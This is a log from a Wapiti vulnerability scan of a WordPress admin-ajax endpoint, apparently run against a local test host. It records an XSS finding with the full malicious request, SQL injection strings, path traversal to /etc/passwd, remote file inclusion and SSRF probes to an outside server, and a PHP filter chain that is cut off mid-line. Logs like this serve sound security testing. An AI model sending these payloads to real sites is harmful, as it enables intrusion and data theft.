2024-03-21 21:15:21.599 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call (0)
2024-03-21 21:15:22.535 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
2024-03-21 21:15:22.535 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_57db724a.db
2024-03-21 21:15:22.540 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 1 URLs and forms during the scan
2024-03-21 21:15:22.587 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
2024-03-21 21:15:22.588 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
2024-03-21 21:15:22.720 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
2024-03-21 21:15:22.752 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
2024-03-21 21:15:22.752 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
2024-03-21 21:15:22.770 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call (0)
2024-03-21 21:15:23.649 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=%3CScRiPt%3Ealert%28%27wcoucqklje%27%29%3C%2FsCrIpT%3E&action=sac_post_type_call (0)
2024-03-21 21:15:24.429 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=%3CScRiPt%3Ealert%28%22wcoucqklje%22%29%3C%2FsCrIpT%3E&action=sac_post_type_call (0)
2024-03-21 21:15:25.051 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=%3CScRiPt%3Ealert%28%2Fwcoucqklje%2F%29%3C%2FsCrIpT%3E&action=sac_post_type_call (0)
2024-03-21 21:15:25.745 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:205 - ---
2024-03-21 21:15:25.745 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:206 - Reflected Cross Site Scripting in http://web/wp-admin/admin-ajax.php via injection in the parameter post_type
2024-03-21 21:15:25.746 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:216 - Evil request:
2024-03-21 21:15:25.746 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:217 -     GET /wp-admin/admin-ajax.php?post_type=%3CScRiPt%3Ealert%28%2Fwcoucqklje%2F%29%3C%2FsCrIpT%3E&action=sac_post_type_call HTTP/1.1
    host: web
    connection: keep-alive
    user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
    accept-language: en-US,en;q=0.5
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    sec-fetch-user: ?1
    sec-fetch-site: none
    sec-fetch-mode: navigate
    sec-fetch-dest: document
    upgrade-insecure-requests: 1
    dnt: 1
2024-03-21 21:15:25.746 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:218 - ---
2024-03-21 21:15:26.638 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
2024-03-21 21:15:26.648 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call (0)
2024-03-21 21:15:26.648 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/wp-admin/admin-ajax.php?post_type=https%3A%2F%2Fopenbugbounty.org%2F&action=sac_post_type_call
2024-03-21 21:15:27.280 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/wp-admin/admin-ajax.php?post_type=%2F%2Fopenbugbounty.org%2F&action=sac_post_type_call
2024-03-21 21:15:27.902 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=https%3A%2F%2Fopenbugbounty.org%2F
2024-03-21 21:15:28.513 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=%2F%2Fopenbugbounty.org%2F
2024-03-21 21:15:29.210 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
2024-03-21 21:15:29.227 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call (0)
2024-03-21 21:15:29.227 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Ff7wgvl%2F1%2F706f73745f74797065%2F&action=sac_post_type_call (0)
2024-03-21 21:15:29.902 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Ff7wgvl%2F1%2F616374696f6e%2F (0)
2024-03-21 21:15:30.544 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=f7wgvl for results, please wait...
2024-03-21 21:15:32.773 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
2024-03-21 21:15:32.782 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call (0)
2024-03-21 21:15:32.806 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
2024-03-21 21:15:32.834 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
2024-03-21 21:15:32.845 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call (0)
2024-03-21 21:15:32.846 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%C2%BF%27%22%28&action=sac_post_type_call (0)
2024-03-21 21:15:33.466 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=fuzz%C2%BF%27%22%28 (0)
2024-03-21 21:15:34.746 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%20AND%2094%3D130%20AND%2093%3D93&action=sac_post_type_call (0)
2024-03-21 21:15:35.355 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%20AND%2056%3D118%20AND%2089%3D89&action=sac_post_type_call (0)
2024-03-21 21:15:35.966 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%20AND%2042%3D42%20AND%2041%3D41&action=sac_post_type_call (0)
2024-03-21 21:15:36.574 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%27%20AND%2038%3D118%20AND%20%2724%27%3D%2724&action=sac_post_type_call (0)
2024-03-21 21:15:37.182 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%27%20AND%2039%3D131%20AND%20%2743%27%3D%2743&action=sac_post_type_call (0)
2024-03-21 21:15:37.797 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%27%20AND%2010%3D10%20AND%20%2756%27%3D%2756&action=sac_post_type_call (0)
2024-03-21 21:15:38.409 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%22%20AND%2034%3D75%20AND%20%2250%22%3D%2250&action=sac_post_type_call (0)
2024-03-21 21:15:39.024 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%22%20AND%2019%3D117%20AND%20%2246%22%3D%2246&action=sac_post_type_call (0)
2024-03-21 21:15:39.635 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%22%20AND%2063%3D63%20AND%20%2211%22%3D%2211&action=sac_post_type_call (0)
2024-03-21 21:15:40.246 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%29%20AND%2013%3D103%20AND%20%2813%3D13&action=sac_post_type_call (0)
2024-03-21 21:15:41.128 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%29%20AND%2066%3D163%20AND%20%2826%3D26&action=sac_post_type_call (0)
2024-03-21 21:15:41.741 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%29%20AND%2044%3D44%20AND%20%2878%3D78&action=sac_post_type_call (0)
2024-03-21 21:15:42.350 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%27%29%20AND%2087%3D160%20AND%20%28%2760%27%3D%2760&action=sac_post_type_call (0)
2024-03-21 21:15:42.961 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%27%29%20AND%2061%3D92%20AND%20%28%2758%27%3D%2758&action=sac_post_type_call (0)
2024-03-21 21:15:43.573 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%27%29%20AND%2065%3D65%20AND%20%28%2741%27%3D%2741&action=sac_post_type_call (0)
2024-03-21 21:15:44.187 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%22%29%20AND%2067%3D109%20AND%20%28%2286%22%3D%2286&action=sac_post_type_call (0)
2024-03-21 21:15:44.800 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%22%29%20AND%2055%3D78%20AND%20%28%2255%22%3D%2255&action=sac_post_type_call (0)
2024-03-21 21:15:45.413 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%22%29%20AND%2051%3D51%20AND%20%28%2239%22%3D%2239&action=sac_post_type_call (0)
2024-03-21 21:15:46.026 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%20AND%2077%3D172%20AND%2058%3D58 (0)
2024-03-21 21:15:46.635 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%20AND%2057%3D76%20AND%2072%3D72 (0)
2024-03-21 21:15:47.294 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%20AND%2046%3D46%20AND%2071%3D71 (0)
2024-03-21 21:15:47.948 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%27%20AND%2067%3D142%20AND%20%2712%27%3D%2712 (0)
2024-03-21 21:15:48.596 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%27%20AND%2010%3D99%20AND%20%2777%27%3D%2777 (0)
2024-03-21 21:15:49.206 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%27%20AND%2018%3D18%20AND%20%2766%27%3D%2766 (0)
2024-03-21 21:15:49.864 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%22%20AND%2055%3D92%20AND%20%2236%22%3D%2236 (0)
2024-03-21 21:15:50.526 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%22%20AND%2031%3D64%20AND%20%2236%22%3D%2236 (0)
2024-03-21 21:15:51.184 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%22%20AND%2084%3D84%20AND%20%2272%22%3D%2272 (0)
2024-03-21 21:15:51.795 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%29%20AND%2011%3D52%20AND%20%2832%3D32 (0)
2024-03-21 21:15:52.404 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%29%20AND%2035%3D117%20AND%20%2837%3D37 (0)
2024-03-21 21:15:53.060 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%29%20AND%2032%3D32%20AND%20%2820%3D20 (0)
2024-03-21 21:15:53.721 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%27%29%20AND%2010%3D29%20AND%20%28%2794%27%3D%2794 (0)
2024-03-21 21:15:54.382 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%27%29%20AND%2025%3D115%20AND%20%28%2761%27%3D%2761 (0)
2024-03-21 21:15:54.993 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%27%29%20AND%2013%3D13%20AND%20%28%2797%27%3D%2797 (0)
2024-03-21 21:15:55.646 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%22%29%20AND%2017%3D94%20AND%20%28%2255%22%3D%2255 (0)
2024-03-21 21:15:56.257 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%22%29%20AND%2089%3D166%20AND%20%28%2263%22%3D%2263 (0)
2024-03-21 21:15:56.867 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%22%29%20AND%2044%3D44%20AND%20%28%2250%22%3D%2250 (0)
2024-03-21 21:15:57.556 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
2024-03-21 21:15:57.571 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call (0)
2024-03-21 21:15:57.577 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&action=sac_post_type_call (0)
2024-03-21 21:15:58.242 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&action=sac_post_type_call (0)
2024-03-21 21:15:58.855 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=%2Fetc%2Fpasswd&action=sac_post_type_call (0)
2024-03-21 21:15:59.466 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=%2Fetc%2Fpasswd%00&action=sac_post_type_call (0)
2024-03-21 21:16:00.076 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=%2Fetc%2Fservices&action=sac_post_type_call (0)
2024-03-21 21:16:00.686 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=%2Fetc%2Fservices%00&action=sac_post_type_call (0)
2024-03-21 21:16:01.296 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&action=sac_post_type_call (0)
2024-03-21 21:16:01.908 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&action=sac_post_type_call (0)
2024-03-21 21:16:02.522 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&action=sac_post_type_call (0)
2024-03-21 21:16:03.135 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=sac_post_type_call (0)
2024-03-21 21:16:03.749 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=sac_post_type_call (0)
2024-03-21 21:16:04.362 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&action=sac_post_type_call (0)
2024-03-21 21:16:04.975 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&action=sac_post_type_call (0)
2024-03-21 21:16:05.586 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&action=sac_post_type_call (0)
2024-03-21 21:16:06.198 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=sac_post_type_call (0)
2024-03-21 21:16:06.811 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=sac_post_type_call (0)
2024-03-21 21:16:07.423 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=sac_post_type_call (0)
2024-03-21 21:16:08.037 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=sac_post_type_call (0)
2024-03-21 21:16:08.650 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=sac_post_type_call (0)
2024-03-21 21:16:09.262 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=sac_post_type_call (0)
2024-03-21 21:16:09.874 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=sac_post_type_call (0)
2024-03-21 21:16:10.486 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=sac_post_type_call (0)
2024-03-21 21:16:11.098 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=sac_post_type_call (0)
2024-03-21 21:16:11.713 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=sac_post_type_call (0)
2024-03-21 21:16:12.326 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=sac_post_type_call (0)
2024-03-21 21:16:12.946 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=sac_post_type_call (0)
2024-03-21 21:16:13.559 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7C